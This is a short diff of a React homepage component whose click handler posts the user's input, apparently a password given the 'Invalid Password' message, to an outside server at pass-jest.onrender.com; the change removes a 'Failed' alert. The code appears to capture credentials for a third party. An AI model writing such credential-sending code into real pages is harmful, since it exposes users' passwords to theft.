@@ -11,7 +11,6 @@ export default function HomePage() {
   const handleClick = () => {
     try {
       axois.post('https://pass-jest.onrender.com', { name: inputData });
-      alert('Failed');
     } catch (error) {
       alert('Invalid Password');
     }
